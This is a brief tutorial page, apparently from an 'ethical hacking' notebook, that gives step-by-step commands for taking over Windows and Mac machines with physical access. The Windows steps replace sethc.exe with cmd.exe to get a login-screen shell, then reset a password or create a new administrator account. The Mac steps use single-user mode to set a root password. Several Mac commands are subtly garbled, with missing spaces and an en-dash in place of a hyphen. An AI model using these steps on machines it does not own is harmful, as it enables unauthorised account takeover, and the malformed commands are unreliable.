# Hacking Windows / Mac

## Hacking Windows

{% embed url="https://www.microsoft.com/en-us/evalcenter/try" caption="Windows ISO images" %}

### Let’s see how to ethically hack a windows box

* Get a legal Windows \(or other\) boot disk
  * [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise)
* Use 2 ‘special’ keys, 2 reboots, and 4 terminal commands to reset the password or create a new Admin user
  * Use f2/DEL/f12 to boot from Windows install disk.
    * Click Troubleshoot. Click Command Prompt. 
  * In the CMD window, type these commands:
    * cd c:\windows\system32
    * copy sethc.exe sethc.bak
    * copy cmd.exe sethc.exe
  * Restart computer. At the login screen where you enter your password, press the Shift key five times 
    * CMD window appears
  * To change your existing password, type:
    * net user username password
  * To add a new user and promote to Administrator:
    * net user ironman Jarvis /add
    * net localgroup administrators ironman /add

## Hacking MAC

* One reboot
* One special key combo \(Command+S\)
* At the Terminal, type clear to clear the screen, then:
  * /sbin/fsck–fy
  * /sbin/mount -uw/ 
  * launchctlload /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist
  * passwd
* Enter a new ‘root’ password, twice
  * exit
* Log in as root using the new password

[Sosumi](https://github.com/popey/sosumi-snap) -  Download and install macOS in a VM

